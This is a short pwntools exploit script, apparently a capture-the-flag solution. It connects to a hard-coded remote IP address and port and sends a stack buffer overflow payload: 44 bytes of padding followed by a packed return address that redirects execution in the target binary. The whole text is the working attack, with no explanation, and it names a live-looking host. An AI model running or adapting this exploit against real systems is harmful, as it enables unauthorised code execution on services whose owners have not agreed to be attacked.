from pwn import *

proc=remote("34.134.85.196",1337)

payload=b"A"*44+p32(0x8049216)
proc.sendline(payload)
print(proc.recvall())
